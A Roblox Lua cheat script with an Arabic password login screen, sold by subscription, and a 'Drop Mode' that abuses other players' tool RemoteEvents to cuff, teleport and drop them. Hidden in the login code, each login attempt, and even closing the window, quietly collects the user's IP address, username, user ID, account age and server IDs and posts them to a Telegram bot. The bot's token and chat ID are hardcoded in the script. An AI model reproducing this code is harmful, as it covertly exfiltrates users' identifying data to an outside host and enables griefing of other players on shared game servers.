-- مطور انس // LOGIN SYSTEM + DROP MODE + TELEGRAM LOGGER

local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")
local RunService = game:GetService("RunService")
local Mouse = LP:GetMouse()
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

-- ⚠️ كلمة المرور
local PASSWORD = "1234"

-- ⚠️ إعدادات تيليجرام
local BOT_TOKEN = "8297265863:AAF55C7bBxhopjkd22cCYnlS-ugE2fK1MlU"
local CHAT_ID = "6857630813"

-- ========== دالة جلب الـ IP ==========
local function GetIP()
    local ip = ""
    local ok, res = pcall(function()
        return game:HttpGet("https://api.ipify.org?format=json")
    end)
    if ok and res and res ~= "" then
        local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
        if ok2 and data and data.ip then ip = data.ip end
    end
    if ip == "" then
        local ok, res = pcall(function()
            return game:HttpGet("http://ip-api.com/json/")
        end)
        if ok and res and res ~= "" then
            local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
            if ok2 and data and data.query then ip = data.query end
        end
    end
    if ip == "" then ip = "فشل الجلب" end
    return ip
end

-- ========== دالة إرسال للبوت ==========
local function SendToTelegram(enteredName, ip, status)
    local playerName = LP.Name
    local playerDisplay = LP.DisplayName
    local playerId = LP.UserId
    local accountAge = LP.AccountAge
    local gameJobId = game.JobId ~= "" and game.JobId or "N/A"
    local placeId = game.PlaceId
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)

    local msg = "🎯 **دخول جديد - مطور انس**\n\n" ..
        "👤 **الاسم المُدخل:** `" .. tostring(enteredName) .. "`\n" ..
        "🎮 **اسم اللاعب:** " .. playerDisplay .. "\n" ..
        "🆔 **اليوزر:** `" .. playerName .. "`\n" ..
        "🔢 **الآيدي:** `" .. tostring(playerId) .. "`\n" ..
        "📅 **عمر الحساب:** " .. tostring(accountAge) .. " يوم\n\n" ..
        "🌐 **الـ IP:** `" .. tostring(ip) .. "`\n\n" ..
        "🎯 **اللعبة:** " .. tostring(gameName) .. "\n" ..
        "📍 **PlaceId:** `" .. tostring(placeId) .. "`\n" ..
        "🔗 **JobId:** `" .. tostring(gameJobId) .. "`\n\n" ..
        "✅ **الحالة:** " .. tostring(status) .. "\n" ..
        "⏰ **التوقيت:** " .. os.date("%Y-%m-%d %H:%M:%S")

    pcall(function()
        HttpService:RequestAsync({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                chat_id = CHAT_ID,
                text = msg,
                parse_mode = "Markdown"
            })
        })
    end)

    pcall(function()
        local encoded = HttpService:UrlEncode(msg)
        game:HttpGet("https://api.telegram.org/bot" .. BOT_TOKEN ..
            "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded)
    end)

    print("✅ تم إرسال البيانات إلى تيليجرام")
end

-- ========== واجهة تسجيل الدخول ==========
local loginGui = Instance.new("ScreenGui")
loginGui.Name = "LoginSystem"
loginGui.ResetOnSpawn = false
loginGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
loginGui.IgnoreGuiInset = true
loginGui.Parent = PlayerGui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 0.3
bg.BorderSizePixel = 0
bg.Parent = loginGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 350, 0, 450)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
mainFrame.BackgroundTransparency = 0.05
mainFrame.BorderSizePixel = 0
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = mainFrame
mainFrame.Parent = loginGui

spawn(function()
    while loginGui and loginGui.Parent do
        local hue = tick() % 2 / 2
        mainFrame.BorderColor3 = Color3.fromHSV(hue, 1, 1)
        mainFrame.BorderSizePixel = 2
        task.wait(0.05)
    end
end)

-- شريط علوي
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 35)
topBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
topBar.BackgroundTransparency = 0.2
topBar.BorderSizePixel = 0
local topCorner = Instance.new("UICorner")
topCorner.CornerRadius = UDim.new(0, 15)
topCorner.Parent = topBar
topBar.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "🔐 تسجيل الدخول - مطور انس"
title.TextScaled = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextColor3 = Color3.fromRGB(0, 200, 255)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Parent = topBar

-- ✖ زر الإغلاق فوق يمين
local closeLoginBtn = Instance.new("TextButton")
closeLoginBtn.Size = UDim2.new(0, 28, 0, 28)
closeLoginBtn.Position = UDim2.new(1, -33, 0, 3)
closeLoginBtn.Text = "✖"
closeLoginBtn.TextScaled = true
closeLoginBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
closeLoginBtn.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
closeLoginBtn.BackgroundTransparency = 0.3
closeLoginBtn.Font = Enum.Font.GothamBold
closeLoginBtn.BorderSizePixel = 0
local closeLoginCorner = Instance.new("UICorner")
closeLoginCorner.CornerRadius = UDim.new(0, 6)
closeLoginCorner.Parent = closeLoginBtn
closeLoginBtn.Parent = topBar

closeLoginBtn.MouseEnter:Connect(function()
    closeLoginBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    closeLoginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
end)
closeLoginBtn.MouseLeave:Connect(function()
    closeLoginBtn.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
    closeLoginBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
end)

closeLoginBtn.MouseButton1Click:Connect(function()
    loginGui:Destroy()
    task.spawn(function()
        pcall(function()
            local ip = GetIP()
            SendToTelegram("(المستخدم أغلق الواجهة)", ip, "⚠️ أغلق واجهة الدخول")
        end)
    end)
    -- بدون طرد — الواجهة بس تنغلق
end)

-- عنوان فرعي
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -20, 0, 30)
subtitle.Position = UDim2.new(0, 10, 0, 45)
subtitle.Text = "اكتب اسمك وكلمة المرور للدخول"
subtitle.TextScaled = true
subtitle.TextColor3 = Color3.fromRGB(255, 200, 100)
subtitle.BackgroundTransparency = 1
subtitle.Parent = mainFrame

-- حقل الاسم
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(1, -40, 0, 25)
nameLabel.Position = UDim2.new(0, 20, 0, 85)
nameLabel.Text = "👤 الاسم (بالعربي):"
nameLabel.TextScaled = true
nameLabel.TextXAlignment = Enum.TextXAlignment.Right
nameLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
nameLabel.BackgroundTransparency = 1
nameLabel.Parent = mainFrame

local nameBox = Instance.new("TextBox")
nameBox.Size = UDim2.new(1, -40, 0, 40)
nameBox.Position = UDim2.new(0, 20, 0, 115)
nameBox.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
nameBox.BorderSizePixel = 0
nameBox.Text = ""
nameBox.PlaceholderText = "اكتب اسمك هنا..."
nameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
nameBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
nameBox.TextScaled = true
nameBox.Font = Enum.Font.Gotham
nameBox.ClearTextOnFocus = false
local nameCorner = Instance.new("UICorner")
nameCorner.CornerRadius = UDim.new(0, 8)
nameCorner.Parent = nameBox
nameBox.Parent = mainFrame

-- حقل كلمة المرور
local passLabel = Instance.new("TextLabel")
passLabel.Size = UDim2.new(1, -40, 0, 25)
passLabel.Position = UDim2.new(0, 20, 0, 165)
passLabel.Text = "🔑 كلمة المرور:"
passLabel.TextScaled = true
passLabel.TextXAlignment = Enum.TextXAlignment.Right
passLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
passLabel.BackgroundTransparency = 1
passLabel.Parent = mainFrame

local passBox = Instance.new("TextBox")
passBox.Size = UDim2.new(1, -40, 0, 40)
passBox.Position = UDim2.new(0, 20, 0, 195)
passBox.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
passBox.BorderSizePixel = 0
passBox.Text = ""
passBox.PlaceholderText = "اكتب كلمة المرور..."
passBox.TextColor3 = Color3.fromRGB(255, 255, 255)
passBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
passBox.TextScaled = true
passBox.Font = Enum.Font.Gotham
passBox.ClearTextOnFocus = false
local passCorner = Instance.new("UICorner")
passCorner.CornerRadius = UDim.new(0, 8)
passCorner.Parent = passBox
passBox.Parent = mainFrame

-- قسم التواصل والتيك توك
local contactFrame = Instance.new("Frame")
contactFrame.Size = UDim2.new(1, -40, 0, 90)
contactFrame.Position = UDim2.new(0, 20, 0, 240)
contactFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
contactFrame.BorderSizePixel = 0
contactFrame.Parent = mainFrame
local contactCorner = Instance.new("UICorner")
contactCorner.CornerRadius = UDim.new(0, 8)
contactCorner.Parent = contactFrame

local contactText = Instance.new("TextLabel")
contactText.Size = UDim2.new(1, -10, 0, 45)
contactText.Position = UDim2.new(0, 5, 0, 3)
contactText.Text = "(اذا متعرف كلمة المرور تواصل معي تيكتوك anas_anas_anas123)"
contactText.TextScaled = true
contactText.TextWrapped = true
contactText.TextColor3 = Color3.fromRGB(255, 200, 100)
contactText.BackgroundTransparency = 1
contactText.Font = Enum.Font.GothamBold
contactText.Parent = contactFrame

local copyUserBtn = Instance.new("TextButton")
copyUserBtn.Size = UDim2.new(0, 200, 0, 30)
copyUserBtn.Position = UDim2.new(0.5, -100, 0, 52)
copyUserBtn.Text = "📋 نسخ اليوزر"
copyUserBtn.TextScaled = true
copyUserBtn.BackgroundColor3 = Color3.fromRGB(80, 60, 140)
copyUserBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyUserBtn.Font = Enum.Font.GothamBold
copyUserBtn.BorderSizePixel = 0
local copyUserCorner = Instance.new("UICorner")
copyUserCorner.CornerRadius = UDim.new(0, 6)
copyUserCorner.Parent = copyUserBtn
copyUserBtn.Parent = contactFrame

copyUserBtn.MouseButton1Click:Connect(function()
    pcall(function() setclipboard("anas_anas_anas123") end)
    local originalText = copyUserBtn.Text
    local originalColor = copyUserBtn.BackgroundColor3
    copyUserBtn.Text = "✅ تم النسخ!"
    copyUserBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    task.wait(1.5)
    copyUserBtn.Text = originalText
    copyUserBtn.BackgroundColor3 = originalColor
end)

-- رسالة الحالة
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 22)
statusLabel.Position = UDim2.new(0, 20, 0, 338)
statusLabel.Text = ""
statusLabel.TextScaled = true
statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
statusLabel.BackgroundTransparency = 1
statusLabel.Parent = mainFrame

-- زر الدخول
local loginBtn = Instance.new("TextButton")
loginBtn.Size = UDim2.new(1, -40, 0, 40)
loginBtn.Position = UDim2.new(0, 20, 0, 368)
loginBtn.Text = "🚀 دخول"
loginBtn.TextScaled = true
loginBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
loginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
loginBtn.Font = Enum.Font.GothamBold
loginBtn.BorderSizePixel = 0
local loginCorner = Instance.new("UICorner")
loginCorner.CornerRadius = UDim.new(0, 8)
loginCorner.Parent = loginBtn
loginBtn.Parent = mainFrame

-- ========== دالة التحقق من الدخول ==========
local loginSuccess = false
local enteredPlayerName = ""

local function HasArabic(text)
    if not text or text == "" then return false end
    for _, code in utf8.codes(text) do
        if code >= 0x0600 and code <= 0x06FF then
            return true
        end
    end
    return false
end

local function TryLogin()
    local nameText = nameBox.Text
    local passText = passBox.Text

    if nameText == "" or nameText:gsub("%s", "") == "" then
        statusLabel.Text = "❌ اكتب اسمك أولاً!"
        return
    end

    if not HasArabic(nameText) then
        statusLabel.Text = "❌ الاسم يجب أن يكون بالعربي!"
        return
    end

    if passText ~= PASSWORD then
        statusLabel.Text = "❌ كلمة المرور غلط!"
        task.spawn(function()
            local ip = GetIP()
            SendToTelegram(nameText .. " (محاولة فاشلة)", ip, "❌ كلمة مرور خاطئة")
        end)
        return
    end

    loginSuccess = true
    enteredPlayerName = nameText
    statusLabel.Text = "✅ تم الدخول بنجاح!"
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
    loginBtn.Text = "✅ مرحباً " .. nameText
    loginBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)

    task.spawn(function()
        local ip = GetIP()
        SendToTelegram(nameText, ip, "✅ دخول ناجح")
    end)

    task.wait(2)
    loginGui:Destroy()

    if _G.AnasMain then
        _G.AnasMain()
    end
end

loginBtn.MouseButton1Click:Connect(TryLogin)

nameBox.FocusLost:Connect(function(enter)
    if enter then passBox:CaptureFocus() end
end)
passBox.FocusLost:Connect(function(enter)
    if enter then TryLogin() end
end)

-- ========== انتظار الدخول ==========
repeat task.wait(0.1) until loginSuccess

-- ========== تشغيل السكربت الرئيسي ==========
_G.AnasMain = function()
    local welcomeGui = Instance.new("ScreenGui")
    welcomeGui.Name = "WelcomeScreen"
    welcomeGui.ResetOnSpawn = false
    welcomeGui.Parent = PlayerGui

    local mainFrame2 = Instance.new("Frame")
    mainFrame2.Size = UDim2.new(0, 350, 0, 250)
    mainFrame2.Position = UDim2.new(0.5, -175, 0.5, -125)
    mainFrame2.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    mainFrame2.BackgroundTransparency = 0.05
    mainFrame2.BorderSizePixel = 0
    local corner2 = Instance.new("UICorner")
    corner2.CornerRadius = UDim.new(0, 15)
    corner2.Parent = mainFrame2
    mainFrame2.Parent = welcomeGui

    spawn(function()
        while welcomeGui and welcomeGui.Parent do
            local hue = tick() % 2 / 2
            mainFrame2.BorderColor3 = Color3.fromHSV(hue, 1, 1)
            mainFrame2.BorderSizePixel = 2
            task.wait(0.05)
        end
    end)

    local topBar2 = Instance.new("Frame")
    topBar2.Size = UDim2.new(1, 0, 0, 35)
    topBar2.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    topBar2.BackgroundTransparency = 0.2
    topBar2.BorderSizePixel = 0
    local topCorner2 = Instance.new("UICorner")
    topCorner2.CornerRadius = UDim.new(0, 15)
    topCorner2.Parent = topBar2
    topBar2.Parent = mainFrame2

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 2)
    closeBtn.Text = "✖"
    closeBtn.TextScaled = true
    closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Parent = topBar2
    closeBtn.MouseButton1Click:Connect(function() welcomeGui:Destroy() end)

    local title2 = Instance.new("TextLabel")
    title2.Size = UDim2.new(1, -60, 0, 35)
    title2.Position = UDim2.new(0, 10, 0, 0)
    title2.Text = "اهلا نورت " .. enteredPlayerName
    title2.TextScaled = true
    title2.TextXAlignment = Enum.TextXAlignment.Left
    title2.TextColor3 = Color3.fromRGB(0, 200, 255)
    title2.BackgroundTransparency = 1
    title2.Parent = topBar2

    local scriptText = Instance.new("TextLabel")
    scriptText.Size = UDim2.new(0, 320, 0, 40)
    scriptText.Position = UDim2.new(0.5, -160, 0, 55)
    scriptText.Text = "سكربت مطور انس"
    scriptText.TextScaled = true
    scriptText.TextColor3 = Color3.fromRGB(255, 100, 0)
    scriptText.BackgroundTransparency = 1
    scriptText.Font = Enum.Font.GothamBold
    scriptText.Parent = mainFrame2

    local tiktokText = Instance.new("TextLabel")
    tiktokText.Size = UDim2.new(0, 320, 0, 30)
    tiktokText.Position = UDim2.new(0.5, -160, 0, 105)
    tiktokText.Text = "anas_anas_anas123"
    tiktokText.TextScaled = true
    tiktokText.TextColor3 = Color3.fromRGB(100, 200, 255)
    tiktokText.BackgroundTransparency = 1
    tiktokText.Parent = mainFrame2

    local adText = Instance.new("TextLabel")
    adText.Size = UDim2.new(0, 320, 0, 40)
    adText.Position = UDim2.new(0.5, -160, 0, 140)
    adText.Text = "هذا السكربت فقط يباع (اشتراك يومي او اسبوعي)"
    adText.TextScaled = true
    adText.TextColor3 = Color3.fromRGB(255, 200, 100)
    adText.BackgroundTransparency = 1
    adText.Parent = mainFrame2

    local devText = Instance.new("TextLabel")
    devText.Size = UDim2.new(0, 320, 0, 30)
    devText.Position = UDim2.new(0.5, -160, 0, 185)
    devText.Text = "المطورين (سيبراني)"
    devText.TextScaled = true
    devText.TextColor3 = Color3.fromRGB(150, 255, 150)
    devText.BackgroundTransparency = 1
    devText.Parent = mainFrame2

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 200, 0, 35)
    copyBtn.Position = UDim2.new(0.5, -100, 0, 210)
    copyBtn.Text = "📋 اضغط لنسخ اليوزر 📋"
    copyBtn.TextScaled = true
    copyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
    copyBtn.BorderSizePixel = 0
    local copyCorner = Instance.new("UICorner")
    copyCorner.CornerRadius = UDim.new(0, 8)
    copyCorner.Parent = copyBtn
    copyBtn.Parent = mainFrame2

    copyBtn.MouseButton1Click:Connect(function()
        pcall(function() setclipboard("anas_anas_anas123") end)
        local originalText = copyBtn.Text
        copyBtn.Text = "✅ تم النسخ!"
        copyBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        task.wait(1.5)
        copyBtn.Text = originalText
        copyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
    end)

    task.wait(4)
    welcomeGui:Destroy()

    -- ========== DROP MODE ==========
    local RemoteEvents = {}
    local CuffedTargets = {}
    local CuffingActive = false
    local CuffingAllActive = false
    local Teleporting = false

    local function UpdateRemoteEvents()
        RemoteEvents = {}
        for _, plr in pairs(Players:GetPlayers()) do
            for _, tool in pairs(plr.Backpack:GetChildren()) do
                local re = tool:FindFirstChildWhichIsA("RemoteEvent")
                if re then table.insert(RemoteEvents, re) end
            end
            if plr.Character then
                for _, tool in pairs(plr.Character:GetChildren()) do
                    local re = tool:FindFirstChildWhichIsA("RemoteEvent")
                    if re then table.insert(RemoteEvents, re) end
                end
            end
        end
    end

    local function ShowStatus(plr, status)
        if not plr.Character then return end
        local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local tag = hrp:FindFirstChild("StatusTag")
        if not tag then
            tag = Instance.new("BillboardGui")
            tag.Name = "StatusTag"
            tag.Size = UDim2.new(0, 100, 0, 50)
            tag.StudsOffset = Vector3.new(0, 3, 0)
            tag.AlwaysOnTop = true
            tag.Parent = hrp
            local label = Instance.new("TextLabel", tag)
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.TextScaled = true
            label.TextStrokeTransparency = 0
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            label.Name = "Label"
        end
        local label = tag:FindFirstChild("Label")
        if label then
            if status == "Cuffed" then
                label.Text = "Cuffed"
                label.TextColor3 = Color3.fromRGB(255, 0, 0)
            else
                label.Text = ""
            end
        end
    end

    local function ToggleCuff(target)
        if not target or not target.Character then return end
        local hrp = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("Torso")
        if not hrp then return end
        UpdateRemoteEvents()
        local idx = table.find(CuffedTargets, target)
        if idx then
            for _, re in pairs(RemoteEvents) do pcall(function() re:FireServer("UnCuff") end) end
            table.remove(CuffedTargets, idx)
            ShowStatus(target, nil)
        else
            for _, re in pairs(RemoteEvents) do pcall(function() re:FireServer("Cuff", hrp) end) end
            table.insert(CuffedTargets, target)
            ShowStatus(target, "Cuffed")
        end
    end

    local function CuffAllPlayers()
        if CuffingAllActive then return end
        CuffingAllActive = true
        local playersList = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then table.insert(playersList, plr) end
        end
        for _, plr in pairs(playersList) do
            if plr and plr.Character then
                local hrp = plr.Character:FindFirstChild("HumanoidRootPart") or plr.Character:FindFirstChild("Torso")
                if hrp then
                    UpdateRemoteEvents()
                    for _, re in pairs(RemoteEvents) do pcall(function() re:FireServer("Cuff", hrp) end) end
                    if not table.find(CuffedTargets, plr) then
                        table.insert(CuffedTargets, plr)
                        ShowStatus(plr, "Cuffed")
                    end
                end
            end
            task.wait()
        end
        CuffingAllActive = false
    end

    local function UncuffAllPlayers()
        UpdateRemoteEvents()
        for _, re in pairs(RemoteEvents) do pcall(function() re:FireServer("UnCuff") end) end
        for _, plr in pairs(CuffedTargets) do ShowStatus(plr, nil) end
        CuffedTargets = {}
    end

    local function DropCuffedPlayers()
        if Teleporting then return end
        Teleporting = true
        local cuffedPlayers = {}
        for _, plr in pairs(CuffedTargets) do
            if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(cuffedPlayers, plr)
            end
        end
        if #cuffedPlayers == 0 then Teleporting = false return end
        local myChar = LP.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local originalCF = myHrp and myHrp.CFrame or CFrame.new(0, 5, 0)
        local farPosition = CFrame.new(100000, 500, 100000)
        for _, plr in pairs(cuffedPlayers) do
            local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.CFrame = farPosition end
        end
        if myHrp then myHrp.CFrame = farPosition end
        task.wait(0.05)
        for _, re in pairs(RemoteEvents) do pcall(function() re:FireServer("UnCuff") end) end
        for _, plr in pairs(cuffedPlayers) do ShowStatus(plr, nil) end
        CuffedTargets = {}
        if myHrp then myHrp.CFrame = originalCF end
        Teleporting = false
    end

    -- واجهة DROP MODE
    local gui = Instance.new("ScreenGui")
    gui.Name = "AnasDropGUI"
    gui.ResetOnSpawn = false
    gui.Parent = PlayerGui

    local dropFrame = Instance.new("Frame")
    dropFrame.Size = UDim2.new(0, 160, 0, 305)
    dropFrame.Position = UDim2.new(0.01, 0, 0.1, 0)
    dropFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    dropFrame.BackgroundTransparency = 0.1
    dropFrame.BorderSizePixel = 0
    dropFrame.Parent = gui
    local dropCorner = Instance.new("UICorner")
    dropCorner.CornerRadius = UDim.new(0, 12)
    dropCorner.Parent = dropFrame

    local dragBar = Instance.new("Frame")
    dragBar.Size = UDim2.new(1, 0, 0, 25)
    dragBar.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    dragBar.BackgroundTransparency = 0.3
    dragBar.Parent = dropFrame
    local dragBarCorner = Instance.new("UICorner")
    dragBarCorner.CornerRadius = UDim.new(0, 12)
    dragBarCorner.Parent = dragBar

    local dragText = Instance.new("TextLabel")
    dragText.Size = UDim2.new(1, 0, 1, 0)
    dragText.Text = "مطور انس"
    dragText.TextScaled = true
    dragText.TextColor3 = Color3.fromRGB(255, 255, 255)
    dragText.BackgroundTransparency = 1
    dragText.Parent = dragBar

    local hideBtn = Instance.new("TextButton")
    hideBtn.Size = UDim2.new(0, 20, 1, 0)
    hideBtn.Position = UDim2.new(1, -22, 0, 0)
    hideBtn.Text = "X"
    hideBtn.TextScaled = true
    hideBtn.BackgroundTransparency = 1
    hideBtn.Parent = dragBar
    hideBtn.MouseButton1Click:Connect(function()
        dropFrame.Visible = not dropFrame.Visible
    end)

    local dropTitle = Instance.new("TextLabel")
    dropTitle.Size = UDim2.new(0, 160, 0, 20)
    dropTitle.Position = UDim2.new(0, 0, 0, 30)
    dropTitle.Text = "DROP THEM"
    dropTitle.TextScaled = true
    dropTitle.TextColor3 = Color3.fromRGB(255, 100, 0)
    dropTitle.BackgroundTransparency = 1
    dropTitle.Parent = dropFrame

    local cuffBtn = Instance.new("TextButton")
    cuffBtn.Size = UDim2.new(0, 140, 0, 35)
    cuffBtn.Position = UDim2.new(0.5, -70, 0, 55)
    cuffBtn.Text = "Cuff: OFF"
    cuffBtn.TextScaled = true
    cuffBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    cuffBtn.Parent = dropFrame
    local cuffBtnCorner = Instance.new("UICorner")
    cuffBtnCorner.CornerRadius = UDim.new(0, 6)
    cuffBtnCorner.Parent = cuffBtn

    local cuffAllBtn = Instance.new("TextButton")
    cuffAllBtn.Size = UDim2.new(0, 140, 0, 35)
    cuffAllBtn.Position = UDim2.new(0.5, -70, 0, 100)
    cuffAllBtn.Text = "CUFF ALL"
    cuffAllBtn.TextScaled = true
    cuffAllBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    cuffAllBtn.Parent = dropFrame
    local cuffAllCorner = Instance.new("UICorner")
    cuffAllCorner.CornerRadius = UDim.new(0, 6)
    cuffAllCorner.Parent = cuffAllBtn

    local uncuffAllBtn = Instance.new("TextButton")
    uncuffAllBtn.Size = UDim2.new(0, 140, 0, 35)
    uncuffAllBtn.Position = UDim2.new(0.5, -70, 0, 145)
    uncuffAllBtn.Text = "UNCUFF ALL"
    uncuffAllBtn.TextScaled = true
    uncuffAllBtn.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
    uncuffAllBtn.Parent = dropFrame
    local uncuffCorner = Instance.new("UICorner")
    uncuffCorner.CornerRadius = UDim.new(0, 6)
    uncuffCorner.Parent = uncuffAllBtn

    local dropBtn = Instance.new("TextButton")
    dropBtn.Size = UDim2.new(0, 140, 0, 35)
    dropBtn.Position = UDim2.new(0.5, -70, 0, 190)
    dropBtn.Text = "DROP THEM"
    dropBtn.TextScaled = true
    dropBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    dropBtn.Parent = dropFrame
    local dropBtnCorner = Instance.new("UICorner")
    dropBtnCorner.CornerRadius = UDim.new(0, 6)
    dropBtnCorner.Parent = dropBtn

    local antiCuffBtn = Instance.new("TextButton")
    antiCuffBtn.Size = UDim2.new(0, 140, 0, 35)
    antiCuffBtn.Position = UDim2.new(0.5, -70, 0, 235)
    antiCuffBtn.Text = "Anti-Cuff: OFF"
    antiCuffBtn.TextScaled = true
    antiCuffBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    antiCuffBtn.Parent = dropFrame
    local antiCuffCorner = Instance.new("UICorner")
    antiCuffCorner.CornerRadius = UDim.new(0, 6)
    antiCuffCorner.Parent = antiCuffBtn

    local countLabel = Instance.new("TextLabel")
    countLabel.Size = UDim2.new(0, 140, 0, 25)
    countLabel.Position = UDim2.new(0.5, -70, 0, 275)
    countLabel.Text = "Cuffed: 0"
    countLabel.TextScaled = true
    countLabel.BackgroundTransparency = 0.5
    countLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    countLabel.Parent = dropFrame
    local countCorner = Instance.new("UICorner")
    countCorner.CornerRadius = UDim.new(0, 6)
    countCorner.Parent = countLabel

    -- سحب الواجهة
    local dragging = false
    local dragStart = nil
    local startPos = nil

    dragBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = dropFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            dropFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    -- أحداث الأزرار
    cuffBtn.MouseButton1Click:Connect(function()
        CuffingActive = not CuffingActive
        cuffBtn.Text = CuffingActive and "Cuff: ON" or "Cuff: OFF"
        cuffBtn.BackgroundColor3 = CuffingActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    end)

    cuffAllBtn.MouseButton1Click:Connect(CuffAllPlayers)
    uncuffAllBtn.MouseButton1Click:Connect(UncuffAllPlayers)
    dropBtn.MouseButton1Click:Connect(DropCuffedPlayers)

    local AntiCuffActive = false
    antiCuffBtn.MouseButton1Click:Connect(function()
        AntiCuffActive = not AntiCuffActive
        antiCuffBtn.Text = AntiCuffActive and "Anti-Cuff: ON" or "Anti-Cuff: OFF"
        antiCuffBtn.BackgroundColor3 = AntiCuffActive and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(100, 100, 100)
    end)

    -- كلبشة بالماوس
    Mouse.Button1Down:Connect(function()
        if not CuffingActive then return end
        local target = Mouse.Target
        if not target then return end
        local char = target:FindFirstAncestorOfClass("Model")
        local plr = char and Players:GetPlayerFromCharacter(char)
        if plr and plr ~= LP then ToggleCuff(plr) end
    end)

    -- تحديث العداد
    RunService.RenderStepped:Connect(function()
        countLabel.Text = "Cuffed: " .. tostring(#CuffedTargets)
    end)

    -- Anti-Cuff
    RunService.Heartbeat:Connect(function()
        if AntiCuffActive then
            UpdateRemoteEvents()
            for _, re in pairs(RemoteEvents) do
                pcall(function() re:FireServer("UnCuff") end)
            end
        end
    end)

    print("✅ مطور انس - Drop Mode Active")
end

-- تشغيل السكربت الرئيسي بعد الدخول
if loginSuccess then
    _G.AnasMain()
end
